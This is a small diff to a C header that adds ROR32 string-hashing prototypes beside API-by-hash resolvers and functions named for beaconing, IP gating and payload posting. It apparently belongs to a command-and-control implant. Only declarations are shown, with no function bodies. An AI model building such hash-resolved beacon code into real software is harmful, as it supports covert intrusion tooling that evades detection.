@@ -52,6 +52,8 @@ typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(HINTERNET hRequest,
 #define WinHttpQueryHeaders_HASH 0x18C58B22
 HMODULE GetModuleHandleH(DWORD moduleHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash);
+INT HashStringRotr32A(_In_ PCHAR String);
+INT HashStringRotr32W(_In_ PWCHAR String);
 BOOL checking_connection(BOOL *Connection);
 BOOL ip_whitelist_gate(VOID);
 BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
